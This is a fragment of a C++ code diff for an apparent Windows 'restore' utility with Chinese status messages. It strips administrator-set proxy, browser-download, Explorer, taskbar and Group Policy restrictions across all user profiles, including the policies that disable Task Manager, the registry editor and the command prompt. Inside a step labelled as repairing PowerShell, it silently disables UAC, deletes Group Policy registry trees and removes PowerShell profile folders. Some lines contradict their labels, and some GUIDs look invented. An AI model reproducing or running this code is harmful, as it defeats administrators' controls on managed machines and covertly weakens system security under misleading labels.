+                    }
+                }
+                
+                Sleep(500);
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegDeleteValueW(hKey, L"AutoConfigURL");
+                    RegDeleteValueW(hKey, L"AutoDetect");
+                    RegDeleteValueW(hKey, L"AutoProxyDetect");
+                    RegDeleteValueW(hKey, L"ProxyOverride");
+                    RegDeleteValueW(hKey, L"ProxyServer");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegDeleteValueW(hKey, L"AutoConfigURL");
+                    RegDeleteValueW(hKey, L"AutoDetect");
+                    RegDeleteValueW(hKey, L"ProxyServer");
+                    RegCloseKey(hKey);
+                }
+                
+                RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Pac");
+                RegDeleteTreeW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Pac");
+                
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f 2>nul");
+                system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f 2>nul");
+                
+                system("netsh interface portproxy reset 2>nul");
+                system("netsh winhttp reset proxy 2>nul");
+                
+                system("ipconfig /flushdns 2>nul");
+                system("netsh winsock reset 2>nul");
+                
+                std::wcout << L"  [完成] 网站访问限制已清除" << std::endl;
+            }
+            
+            std::wcout << L"[13/13] 正在恢复浏览器下载功能..." << std::endl;
+            {
+                HKEY hKey;
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Edge", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"AutoOpenFileTypes");
+                    RegDeleteValueW(hKey, L"DownloadRestrictions");
+                    RegDeleteValueW(hKey, L"DisableDownload");
+                    RegDeleteValueW(hKey, L"PromptForDownloadLocation");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Edge", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"AutoOpenFileTypes");
+                    RegDeleteValueW(hKey, L"DownloadRestrictions");
+                    RegDeleteValueW(hKey, L"DisableDownload");
+                    RegDeleteValueW(hKey, L"PromptForDownloadLocation");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Google\\Chrome", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DownloadRestrictions");
+                    RegDeleteValueW(hKey, L"DisableDownload");
+                    RegDeleteValueW(hKey, L"DownloadDirectory");
+                    RegDeleteValueW(hKey, L"PromptForDownloadLocation");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Google\\Chrome", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DownloadRestrictions");
+                    RegDeleteValueW(hKey, L"DisableDownload");
+                    RegDeleteValueW(hKey, L"DownloadDirectory");
+                    RegDeleteValueW(hKey, L"PromptForDownloadLocation");
+                    RegCloseKey(hKey);
+                }
+                
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Edge\\DownloadRestrictions\" /f 2>nul");
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Edge\\DownloadRestrictions\" /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Google\\Chrome\\DownloadRestrictions\" /f 2>nul");
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Google\\Chrome\\DownloadRestrictions\" /f 2>nul");
+                
+                std::wcout << L"  [完成] 浏览器下载功能已恢复" << std::endl;
+            }
+            
+            {
+                system("taskkill /f /im \"msedge.exe\" 2>nul");
+                Sleep(500);
+                
+                HKEY hKey;
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Edge", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"SurfGameEnabled");
+                    RegDeleteValueW(hKey, L"SurfingEnabled");
+                    RegDeleteValueW(hKey, L"GameFeedEnabled");
+                    RegDeleteValueW(hKey, L"BlockWebchache");
+                    RegDeleteValueW(hKey, L"ConfigureBrowserUpdateSettings");
+                    RegDeleteValueW(hKey, L"ChromeGameEnabled");
+                    RegDeleteValueW(hKey, L"AllowSurfGames");
+                    RegDeleteValueW(hKey, L"BrowserControlOfUsageProfile");
+                    RegDeleteValueW(hKey, L"AllowSurfGame");
+                    RegDeleteValueW(hKey, L"DeveloperToolsAvailability");
+                    RegDeleteValueW(hKey, L"WebWidgetAllowed");
+                    RegDeleteValueW(hKey, L"SaveAs");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Edge", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"SurfGameEnabled");
+                    RegDeleteValueW(hKey, L"SurfingEnabled");
+                    RegDeleteValueW(hKey, L"GameFeedEnabled");
+                    RegDeleteValueW(hKey, L"AllowSurfGames");
+                    RegDeleteValueW(hKey, L"AllowSurfGame");
+                    RegDeleteValueW(hKey, L"DeveloperToolsAvailability");
+                    RegDeleteValueW(hKey, L"WebWidgetAllowed");
+                    RegDeleteValueW(hKey, L"SaveAs");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Edge\\Main", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"SurfGameEnabled");
+                    RegDeleteValueW(hKey, L"PlayableContentAllowed");
+                    RegDeleteValueW(hKey, L"PlayableContentDiscoveryAllowed");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisablePersonalizeFavoritesAndRecommendations");
+                    RegDeleteValueW(hKey, L"DisableEdgeShoppingTask");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Edge\\BLPolicy", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"SurfGameEnabled");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\EdgeUpdate\\Clients", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+                
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Edge\" /v SurfGameEnabled /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Edge\" /v AllowSurfGames /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Edge\\Main\" /v PlayableContentAllowed /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Edge\\Main\" /v PlayableContentDiscoveryAllowed /t REG_DWORD /d 1 /f 2>nul");
+                
+                std::wstring userProfile = _wgetenv(L"USERPROFILE");
+                if (!userProfile.empty()) {
+                    std::wstring edgeCachePath = userProfile + L"\\AppData\\Local\\Microsoft\\Edge\\User Data";
+                    std::wstring cmd = L"attrib -h -r \"" + edgeCachePath + L"\" /s /d 2>nul";
+                    _wsystem(cmd.c_str());
+                }
+                
+                std::wcout << L"  [完成] Edge浏览器内置应用已恢复" << std::endl;
+            }
+            
+            std::wcout << L"[额外] 正在分析并修复异常PowerShell..." << std::endl;
+            {
+                HKEY hKey;
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"PromptOnSecureDesktop", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoRun");
+                    RegDeleteValueW(hKey, L"NoFind");
+                    RegDeleteValueW(hKey, L"NoDriveTypeAutoRun");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 1;
+                    RegSetValueExW(hKey, L"Hidden", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"ShowSuperHidden", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"HideFileExt", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+                
+                RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects");
+                RegDeleteTreeW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects");
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"ExecutionPolicy");
+                    RegDeleteValueW(hKey, L"EnableScripts");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoViewOnDrive");
+                    RegDeleteValueW(hKey, L"RestrictToHKLM");
+                    RegCloseKey(hKey);
+                }
+                
+                system("attrib -h -r C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 2>nul");
+                system("attrib -h -r C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe 2>nul");
+                
+                system("echo y | reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\powershell.exe\" /v Path /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\" /f 2>nul");
+                system("echo y | reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\powershell.exe\" /v \"\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /f 2>nul");
+                
+                {
+                    std::wstring userProfile = _wgetenv(L"USERPROFILE");
+                    if (!userProfile.empty()) {
+                        std::vector<std::wstring> profilesToDelete = {
+                            userProfile + L"\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1",
+                            userProfile + L"\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1",
+                            userProfile + L"\\Documents\\profile.ps1",
+                            userProfile + L"\\Documents\\WindowsPowerShell\\profile.ps1",
+                            userProfile + L"\\Documents\\PowerShell\\profile.ps1",
+                            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1",
+                            L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\profile.ps1"
+                        };
+                        
+                        std::wstring allUsersProfile = _wgetenv(L"ALLUSERSPROFILE");
+                        if (!allUsersProfile.empty()) {
+                            profilesToDelete.push_back(allUsersProfile + L"\\WindowsPowerShell\\profile.ps1");
+                        }
+                        
+                        for (const auto& profilePath : profilesToDelete) {
+                            DWORD attr = GetFileAttributesW(profilePath.c_str());
+                            if (attr != INVALID_FILE_ATTRIBUTES) {
+                                SetFileAttributesW(profilePath.c_str(), FILE_ATTRIBUTE_NORMAL);
+                                DeleteFileW(profilePath.c_str());
+                            }
+                        }
+                        
+                        std::wstring psDir1 = userProfile + L"\\Documents\\WindowsPowerShell";
+                        std::wstring psDir2 = userProfile + L"\\Documents\\PowerShell";
+                        
+                        auto deleteDirRecursive = [](const std::wstring& dirPath) {
+                            std::wstring searchPath = dirPath + L"\\*";
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
+                                        std::wstring fullPath = dirPath + L"\\" + findData.cFileName;
+                                        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                                            RemoveDirectoryW(fullPath.c_str());
+                                        } else {
+                                            SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+                                            DeleteFileW(fullPath.c_str());
+                                        }
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
+                            RemoveDirectoryW(dirPath.c_str());
+                        };
+                        
+                        deleteDirRecursive(psDir1);
+                        deleteDirRecursive(psDir2);
+                    }
+                }
+                
+                system("powershell -ExecutionPolicy Bypass -Command \"Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -Confirm:$false\" 2>nul");
+                system("powershell -ExecutionPolicy Bypass -Command \"Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force -Confirm:$false\" 2>nul");
+                
+                std::wcout << L"  [完成] 已分析并修复PowerShell" << std::endl;
+            }
+            
+            std::wcout << L"[额外] 正在恢复任务栏和开始菜单右键功能..." << std::endl;
+            {
+                HKEY hKey;
+
+                // 删除用户策略中的限制
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoTrayContextMenu");
+                    RegDeleteValueW(hKey, L"NoViewContextMenu");
+                    RegDeleteValueW(hKey, L"NoDesktop");
+                    RegDeleteValueW(hKey, L"NoSetTaskbar");
+                    RegDeleteValueW(hKey, L"NoClose");
+                    RegDeleteValueW(hKey, L"NoLogoff");
+                    RegDeleteValueW(hKey, L"NoStartMenuSubFolders");
+                    RegDeleteValueW(hKey, L"NoStartMenuMorePrograms");
+                    RegDeleteValueW(hKey, L"NoStartMenuMFUprogramsList");
+                    RegDeleteValueW(hKey, L"NoStartMenuMyMusic");
+                    RegDeleteValueW(hKey, L"NoStartMenuNetworkPlaces");
+                    RegDeleteValueW(hKey, L"NoStartMenuPrinters");
+                    RegDeleteValueW(hKey, L"NoStartMenuRecentDocs");
+                    RegDeleteValueW(hKey, L"NoStartMenuSearch");
+                    RegDeleteValueW(hKey, L"NoStartMenuRun");
+                    RegDeleteValueW(hKey, L"NoStartMenuHelp");
+                    RegDeleteValueW(hKey, L"NoStartMenuDragDrop");
+                    RegDeleteValueW(hKey, L"NoStartMenuPinnedList");
+                    RegDeleteValueW(hKey, L"NoStartBanner");
+                    RegDeleteValueW(hKey, L"NoToolbarsOnTaskbar");
+                    RegDeleteValueW(hKey, L"NoTaskGrouping");
+                    RegDeleteValueW(hKey, L"NoTaskbarClock");
+                    RegDeleteValueW(hKey, L"NoTaskMgr");
+                    RegDeleteValueW(hKey, L"NoControlPanel");
+                    RegDeleteValueW(hKey, L"NoSetTaskbar");
+                    RegDeleteValueW(hKey, L"NoTrayItemsDisplay");
+                    RegDeleteValueW(hKey, L"NoContextMenu");
+                    RegDeleteValueW(hKey, L"NoFileMenu");
+                    RegDeleteValueW(hKey, L"NoBandCustomize");
+                    RegDeleteValueW(hKey, L"NoMovingBands");
+                    RegDeleteValueW(hKey, L"NoCloseDragDropBands");
+                    RegDeleteValueW(hKey, L"NoResolveSearch");
+                    RegDeleteValueW(hKey, L"NoResolveTrack");
+                    RegDeleteValueW(hKey, L"NoTaskbarContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenuContextMenu");
+                    RegDeleteValueW(hKey, L"NoToolbarCustomize");
+                    RegCloseKey(hKey);
+                }
+
+                // 删除系统策略中的限制
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoTrayContextMenu");
+                    RegDeleteValueW(hKey, L"NoViewContextMenu");
+                    RegDeleteValueW(hKey, L"NoDesktop");
+                    RegDeleteValueW(hKey, L"NoSetTaskbar");
+                    RegDeleteValueW(hKey, L"NoClose");
+                    RegDeleteValueW(hKey, L"NoLogoff");
+                    RegDeleteValueW(hKey, L"NoStartMenuSubFolders");
+                    RegDeleteValueW(hKey, L"NoStartMenuMorePrograms");
+                    RegDeleteValueW(hKey, L"NoStartMenuMFUprogramsList");
+                    RegDeleteValueW(hKey, L"NoStartMenuMyMusic");
+                    RegDeleteValueW(hKey, L"NoStartMenuNetworkPlaces");
+                    RegDeleteValueW(hKey, L"NoStartMenuPrinters");
+                    RegDeleteValueW(hKey, L"NoStartMenuRecentDocs");
+                    RegDeleteValueW(hKey, L"NoStartMenuSearch");
+                    RegDeleteValueW(hKey, L"NoStartMenuRun");
+                    RegDeleteValueW(hKey, L"NoStartMenuHelp");
+                    RegDeleteValueW(hKey, L"NoStartMenuDragDrop");
+                    RegDeleteValueW(hKey, L"NoStartMenuPinnedList");
+                    RegDeleteValueW(hKey, L"NoStartBanner");
+                    RegDeleteValueW(hKey, L"NoToolbarsOnTaskbar");
+                    RegDeleteValueW(hKey, L"NoTaskGrouping");
+                    RegDeleteValueW(hKey, L"NoTaskbarClock");
+                    RegDeleteValueW(hKey, L"NoTaskMgr");
+                    RegDeleteValueW(hKey, L"NoControlPanel");
+                    RegDeleteValueW(hKey, L"NoSetTaskbar");
+                    RegDeleteValueW(hKey, L"NoTrayItemsDisplay");
+                    RegDeleteValueW(hKey, L"NoContextMenu");
+                    RegDeleteValueW(hKey, L"NoFileMenu");
+                    RegDeleteValueW(hKey, L"NoBandCustomize");
+                    RegDeleteValueW(hKey, L"NoMovingBands");
+                    RegDeleteValueW(hKey, L"NoCloseDragDropBands");
+                    RegDeleteValueW(hKey, L"NoResolveSearch");
+                    RegDeleteValueW(hKey, L"NoResolveTrack");
+                    RegDeleteValueW(hKey, L"NoTaskbarContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenuContextMenu");
+                    RegDeleteValueW(hKey, L"NoToolbarCustomize");
+                    RegCloseKey(hKey);
+                }
+
+                // 删除组策略中的限制（开始菜单和任务栏）
+                if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoTrayContextMenu");
+                    RegDeleteValueW(hKey, L"NoTaskbarContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenuContextMenu");
+                    RegDeleteValueW(hKey, L"NoViewContextMenu");
+                    RegDeleteValueW(hKey, L"NoContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenu");
+                    RegDeleteValueW(hKey, L"NoTaskbar");
+                    RegDeleteValueW(hKey, L"NoPinningToTaskbar");
+                    RegDeleteValueW(hKey, L"NoPinningToStartMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenuMorePrograms");
+                    RegDeleteValueW(hKey, L"NoStartMenuSubFolders");
+                    RegDeleteValueW(hKey, L"HidePowerOptions");
+                    RegDeleteValueW(hKey, L"HideUserAccount");
+                    RegDeleteValueW(hKey, L"HideSignOut");
+                    RegDeleteValueW(hKey, L"HideSwitchUser");
+                    RegDeleteValueW(hKey, L"HideLock");
+                    RegDeleteValueW(hKey, L"HideSleep");
+                    RegDeleteValueW(hKey, L"HideHibernate");
+                    RegDeleteValueW(hKey, L"HideRestart");
+                    RegDeleteValueW(hKey, L"HideShutDown");
+                    RegDeleteValueW(hKey, L"DisableNotificationCenter");
+                    RegDeleteValueW(hKey, L"DisableControlCenter");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoTrayContextMenu");
+                    RegDeleteValueW(hKey, L"NoTaskbarContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenuContextMenu");
+                    RegDeleteValueW(hKey, L"NoViewContextMenu");
+                    RegDeleteValueW(hKey, L"NoContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenu");
+                    RegDeleteValueW(hKey, L"NoTaskbar");
+                    RegDeleteValueW(hKey, L"NoPinningToTaskbar");
+                    RegDeleteValueW(hKey, L"NoPinningToStartMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenuMorePrograms");
+                    RegDeleteValueW(hKey, L"NoStartMenuSubFolders");
+                    RegDeleteValueW(hKey, L"HidePowerOptions");
+                    RegDeleteValueW(hKey, L"HideUserAccount");
+                    RegDeleteValueW(hKey, L"HideSignOut");
+                    RegDeleteValueW(hKey, L"HideSwitchUser");
+                    RegDeleteValueW(hKey, L"HideLock");
+                    RegDeleteValueW(hKey, L"HideSleep");
+                    RegDeleteValueW(hKey, L"HideHibernate");
+                    RegDeleteValueW(hKey, L"HideRestart");
+                    RegDeleteValueW(hKey, L"HideShutDown");
+                    RegDeleteValueW(hKey, L"DisableNotificationCenter");
+                    RegDeleteValueW(hKey, L"DisableControlCenter");
+                    RegCloseKey(hKey);
+                }
+
+                // 遍历HKEY_USERS中所有用户SID，删除策略限制
+                {
+                    HKEY hUsersKey;
+                    if (RegOpenKeyW(HKEY_USERS, NULL, &hUsersKey) == ERROR_SUCCESS) {
+                        wchar_t sidName[256];
+                        DWORD sidNameSize = 256;
+                        DWORD index = 0;
+
+                        while (RegEnumKeyW(hUsersKey, index, sidName, sidNameSize) == ERROR_SUCCESS) {
+                            if (wcslen(sidName) > 10 && wcsstr(sidName, L"_Classes") == NULL) {
+                                std::wstring explorerKeyPath = std::wstring(sidName) + L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
+                                std::wstring policyKeyPath = std::wstring(sidName) + L"\\Software\\Policies\\Microsoft\\Windows\\Explorer";
+
+                                HKEY hUserKey;
+                                if (RegOpenKeyW(HKEY_USERS, explorerKeyPath.c_str(), &hUserKey) == ERROR_SUCCESS) {
+                                    RegDeleteValueW(hUserKey, L"NoTrayContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoViewContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoTaskbarContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoStartMenuContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoDesktop");
+                                    RegDeleteValueW(hUserKey, L"NoSetTaskbar");
+                                    RegDeleteValueW(hUserKey, L"NoTaskMgr");
+                                    RegDeleteValueW(hUserKey, L"NoControlPanel");
+                                    RegCloseKey(hUserKey);
+                                }
+
+                                if (RegOpenKeyW(HKEY_USERS, policyKeyPath.c_str(), &hUserKey) == ERROR_SUCCESS) {
+                                    RegDeleteValueW(hUserKey, L"NoTrayContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoTaskbarContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoStartMenuContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoViewContextMenu");
+                                    RegDeleteValueW(hUserKey, L"NoContextMenu");
+                                    RegCloseKey(hUserKey);
+                                }
+                            }
+                            index++;
+                            sidNameSize = 256;
+                        }
+                        RegCloseKey(hUsersKey);
+                    }
+                }
+
+                // 删除默认用户配置中的限制
+                {
+                    HKEY hDefaultKey;
+                    if (RegOpenKeyW(HKEY_USERS, L".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hDefaultKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hDefaultKey, L"NoTrayContextMenu");
+                        RegDeleteValueW(hDefaultKey, L"NoViewContextMenu");
+                        RegDeleteValueW(hDefaultKey, L"NoTaskbarContextMenu");
+                        RegDeleteValueW(hDefaultKey, L"NoStartMenuContextMenu");
+                        RegDeleteValueW(hDefaultKey, L"NoContextMenu");
+                        RegCloseKey(hDefaultKey);
+                    }
+                }
+
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 1;
+                    RegSetValueExW(hKey, L"EnableXamlStartMenu", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"Start_TrackProgs", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"Start_TrackDocs", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"TaskbarGlomLevel", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"ShowTaskViewButton", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"ShowCortanaButton", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"{863D2FEE-3F9B-11D2-9F0E-006097C998F7}");
+                    RegDeleteValueW(hKey, L"{000214E6-0000-0000-C000-000000000046}");
+                    RegDeleteValueW(hKey, L"{000214E7-0000-0000-C000-000000000046}");
+                    RegDeleteValueW(hKey, L"{000214E8-0000-0000-C000-000000000046}");
+                    RegDeleteValueW(hKey, L"{000214E9-0000-0000-C000-000000000046}");
+                    RegDeleteValueW(hKey, L"{4657278A-412B-11CF-842C-00AA0044C9B3}");
+                    RegDeleteValueW(hKey, L"{1F4DE370-D627-11D1-BA4F-00A0C91EEDBA}");
+                    RegDeleteValueW(hKey, L"{450D8FBA-AD25-11D0-98A8-0800361B1103}");
+                    RegDeleteValueW(hKey, L"{2F8864B8-9BB5-4B78-906C-5E8F8F5F5F5F}");
+                    RegDeleteValueW(hKey, L"{D6536473-D610-4C4B-95D8-5F5F5F5F5F5F}");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CLASSES_ROOT, L"CLSID\\{863D2FEE-3F9B-11D2-9F0E-006097C998F7}\\InprocServer32", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"Directory\\Background\\shell", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"Directory\\Background\\shell\\cmd", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                system("reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\cmd\" /ve /d \"在此处打开命令窗口\" /f 2>nul");
+                system("reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\cmd\" /v ShowBasedOnVelocityId /t REG_DWORD /d 0x639bc8 /f 2>nul");
+
+                if (RegOpenKeyW(HKEY_CLASSES_ROOT, L"Drive\\shellex\\ContextMenuHandlers", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CLASSES_ROOT, L"Folder\\shellex\\ContextMenuHandlers", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CLASSES_ROOT, L"Directory\\shellex\\ContextMenuHandlers", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"EnableUIADesktopToggle");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableTaskMgr");
+                    RegDeleteValueW(hKey, L"DisableRegistryTools");
+                    RegDeleteValueW(hKey, L"DisableCMD");
+                    RegCloseKey(hKey);
+                }
+
